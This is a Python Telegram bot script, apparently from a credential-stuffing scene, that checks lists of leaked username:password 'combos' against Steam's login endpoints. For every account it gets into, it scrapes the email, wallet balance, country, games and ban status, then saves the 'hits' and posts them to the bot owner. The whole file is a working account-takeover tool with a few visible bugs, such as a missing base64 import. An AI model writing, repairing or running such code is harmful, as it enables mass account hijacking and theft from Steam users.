#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🚀 STEAM CHECKER TELEGRAM BOT - FIXED & IMPROVED
Features added:
- Better error handling
- Improved login flow with mobile headers
- Nicer formatted hit messages
- Real-time progress every 10 accounts
- Better summary
- Safer OWNER_ID handling
- Reduced threads for Railway stability
"""

import os
import sys
import time
import asyncio
import logging
import re
import random
from pathlib import Path
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ========================= CONFIG =========================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OWNER_ID_STR = os.getenv("OWNER_ID", "0").strip()

try:
    OWNER_ID = int(OWNER_ID_STR)
except ValueError:
    raise ValueError(f"❌ OWNER_ID must be a NUMBER only! Got: '{OWNER_ID_STR}'.\nGet your ID from @userinfobot")

if not TELEGRAM_TOKEN:
    raise ValueError("❌ TELEGRAM_TOKEN is not set in Railway Variables!")

MY_SIGNATURE = "@pyabrodie"
TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"

# Global stats
lock = asyncio.Lock()
stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== HELPER FUNCTIONS ======================
def create_results_folder():
    folder = "Results"
    Path(folder).mkdir(parents=True, exist_ok=True)
    return folder

def save_hit(folder, filename, data):
    filepath = os.path.join(folder, filename)
    if not os.path.exists(filepath):
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"# Steam Checker by {MY_SIGNATURE}\n# {TELEGRAM_CHANNEL}\n\n")
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{data}\n")

def shorten_games(games, limit=12):
    if not games:
        return "None"
    if len(games) > limit:
        return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
    return " | ".join(games)

# ====================== STEAM CHECKER ======================
def check_steam_account(combo: str):
    try:
        username, password = [x.strip() for x in combo.split(':', 1)]
    except:
        return None

    session = requests.Session()
    session.verify = False

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://steamcommunity.com",
        "Referer": "https://steamcommunity.com/login/",
    }
    session.headers.update(headers)

    try:
        # 1. Get RSA Key
        r1 = session.post(
            "https://steamcommunity.com/login/getrsakey/",
            data={"donotcache": str(int(time.time())), "username": username},
            timeout=12
        )
        j1 = r1.json()
        if not j1.get("success"):
            return None

        # 2. Encrypt password
        rsa_key = RSA.construct((int(j1["publickey_mod"], 16), int(j1["publickey_exp"], 16)))
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted_pass = base64.b64encode(cipher.encrypt(password.encode())).decode()

        # 3. Login
        payload = {
            "donotcache": str(int(time.time())),
            "password": encrypted_pass,
            "username": username,
            "twofactorcode": "",
            "emailauth": "",
            "loginfriendlyname": "",
            "captchagid": "-1",
            "captcha_text": "",
            "emailsteamid": "",
            "rsatimestamp": j1["timestamp"],
            "remember_login": "false",
        }

        r2 = session.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=15)
        j2 = r2.json()

        if not j2.get("success"):
            return None

        # Set cookies properly
        for cookie in r2.cookies:
            session.cookies.set(cookie.name, cookie.value, domain="steamcommunity.com")
            session.cookies.set(cookie.name, cookie.value, domain="steampowered.com")

        # 4. Fetch account details
        time.sleep(0.8)
        r_acc = session.get("https://store.steampowered.com/account/", timeout=15)
        email, balance, country = parse_account_page(r_acc.text)

        time.sleep(0.8)
        r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=15)
        total_games, level, limited = parse_profile_page(r_profile.text)

        games = []
        if int(total_games or 0) > 0:
            time.sleep(0.8)
            r_games = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
            games = parse_games_page(r_games.text)

        # Bans
        vac = game_ban = comm_ban = "Unknown"
        if "/profiles/" in r_profile.url:
            steamid = r_profile.url.split("/profiles/")[1].split("/")[0]
            time.sleep(0.8)
            r_ban = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=15)
            vac, game_ban, comm_ban = parse_ban_page(r_ban.text)

        result = {
            "username": username,
            "password": password,
            "email": email or "Unknown",
            "balance": balance or "Unknown",
            "country": country or "Unknown",
            "total_games": total_games or "0",
            "games": games,
            "level": level or "0",
            "limited": limited,
            "vac_bans": vac,
            "game_bans": game_ban,
            "community_ban": comm_ban,
        }
        session.close()
        return result

    except Exception as e:
        logger.error(f"Error checking {username}: {e}")
        return None

# ====================== PARSERS (Improved) ======================
def parse_account_page(html):
    email = balance = country = "Unknown"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if email_input := soup.find("input", {"id": "account_name"}):
            email = email_input.get("value", "Unknown")
        if bal := soup.find("a", {"id": "header_wallet_balance"}):
            balance = bal.get_text(strip=True)
        if country_select := soup.find("select", {"id": "account_country"}):
            if selected := country_select.find("option", {"selected": True}):
                country = selected.get_text(strip=True)
    except:
        pass
    return email, balance, country

def parse_profile_page(html):
    total_games = level = "0"
    limited = "No"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if games_a := soup.find("a", href=re.compile(r"/games/")):
            if span := games_a.find("span", class_=re.compile("count")):
                m = re.search(r'(\d+)', span.text)
                if m: total_games = m.group(1)
        if lvl := soup.find("span", class_=re.compile("friendPlayerLevelNum")):
            level = lvl.get_text(strip=True)
        if "limited account" in html.lower():
            limited = "Yes"
    except:
        pass
    return total_games, level, limited

def parse_games_page(html):
    games = []
    try:
        soup = BeautifulSoup(html, "html.parser")
        for div in soup.find_all("div", class_="gameListRowItemName")[:30]:
            if title := div.get_text(strip=True):
                games.append(title)
    except:
        pass
    return games

def parse_ban_page(html):
    vac = game_ban = "0"
    comm = "No"
    try:
        if m := re.search(r'(\d+)\s*VAC', html, re.I):
            vac = m.group(1)
        if m := re.search(r'(\d+)\s*game ban', html, re.I):
            game_ban = m.group(1)
        if "community ban" in html.lower() or "banned from community" in html.lower():
            comm = "Yes"
    except:
        pass
    return vac, game_ban, comm

# ====================== BOT HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    await update.message.reply_text(
        "🤖 <b>Steam Checker Bot Ready!</b>\n\n"
        "Send <b>.txt</b> file with combos:\n"
        "<code>username:password</code>\n\n"
        "I'll check them and send full details.",
        parse_mode=ParseMode.HTML
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return

    doc = update.message.document
    if not doc.file_name.lower().endswith('.txt'):
        await update.message.reply_text("Please send a .txt combo file!")
        return

    await update.message.reply_text(f"📥 Received: <b>{doc.file_name}</b>\nDownloading...", parse_mode=ParseMode.HTML)

    file = await doc.get_file()
    path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(path)

    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip() and len(line.strip()) > 5]

    if not combos:
        await update.message.reply_text("No valid combos found!")
        return

    await update.message.reply_text(f"✅ Loaded <b>{len(combos)}</b> accounts. Starting check...", parse_mode=ParseMode.HTML)

    # Run in background
    asyncio.create_task(process_all_combos(combos, update.effective_chat.id, context.bot))

async def process_all_combos(combos, chat_id, bot):
    global stats
    stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': len(combos), 'start_time': time.time()}

    folder = create_results_folder()

    async def update_progress():
        while stats['checked'] < stats['total']:
            await asyncio.sleep(8)
            if stats['checked'] % 10 == 0 or stats['checked'] == stats['total']:
                await bot.send_message(
                    chat_id=chat_id,
                    text=f"🔄 Progress: {stats['checked']}/{stats['total']} checked | Valid: {stats['valid']}",
                    parse_mode=ParseMode.HTML
                )

    asyncio.create_task(update_progress())

    with ThreadPoolExecutor(max_workers=8) as executor:   # Reduced for Railway
        futures = [executor.submit(process_one, combo, folder, chat_id, bot) for combo in combos]
        for f in futures:
            f.result()

    # Final summary
    summary = create_summary()
    await bot.send_message(chat_id=chat_id, text=summary, parse_mode=ParseMode.HTML)

    # Send result files
    for fname in ["Valid_With_Email.txt", "Valid_Without_Email.txt", "All_Hits.txt"]:
        p = os.path.join(folder, fname)
        if os.path.exists(p) and os.path.getsize(p) > 50:
            await bot.send_document(chat_id=chat_id, document=open(p, 'rb'), caption=f"📄 {fname}")

def process_one(combo, folder, chat_id, bot):
    result = check_steam_account(combo)
    if result:
        save_result(result, folder)
        asyncio.run(send_hit_message(result, chat_id, bot))
        with lock:
            stats['valid'] += 1
    else:
        with lock:
            stats['invalid'] += 1
    with lock:
        stats['checked'] += 1

def save_result(result, folder):
    hit = f"{result['username']}:{result['password']}"
    save_hit(folder, "All_Hits.txt", hit)

    if result['email'] != "Unknown":
        data = f"{result['username']}:{result['password']}\n{result['email']}:{result['password']}"
        save_hit(folder, "Valid_With_Email.txt", data)
    else:
        save_hit(folder, "Valid_Without_Email.txt", hit)

async def send_hit_message(result, chat_id, bot):
    games_str = shorten_games(result['games'])
    msg = f"""✅ <b>STEAM HIT FOUND</b>

🔑 <b>Account:</b> <code>{result['username']}:{result['password']}</code>
💰 <b>Balance:</b> {result['balance']}
🌍 <b>Country:</b> {result['country']}
🎮 <b>Games:</b> {result['total_games']} ({games_str})
📊 <b>Level:</b> {result['level']} | Limited: {result['limited']}
🚫 <b>Bans:</b> VAC:{result['vac_bans']} | Game:{result['game_bans']} | Comm:{result['community_ban']}
📧 <b>Email:</b> {result['email']}

💎 {MY_SIGNATURE}"""

    try:
        await bot.send_message(chat_id=chat_id, text=msg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except:
        pass

def create_summary():
    elapsed = time.time() - (stats.get('start_time') or time.time())
    m = int(elapsed // 60)
    s = int(elapsed % 60)
    return f"""✅ <b>SCAN COMPLETE</b>

⏱️ Time: {m}m {s}s
✅ Valid: {stats['valid']}
❌ Invalid: {stats['invalid']}
📊 Total: {stats['total']}

📁 Results files sent above.
💎 {MY_SIGNATURE} | {TELEGRAM_CHANNEL}"""

# ====================== MAIN ======================
def main():
    Path("Results").mkdir(exist_ok=True)

    app = Application.builder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_file))

    print("🚀 Steam Checker Bot Started Successfully!")
    app.run_polling()

if __name__ == "__main__":
    main()
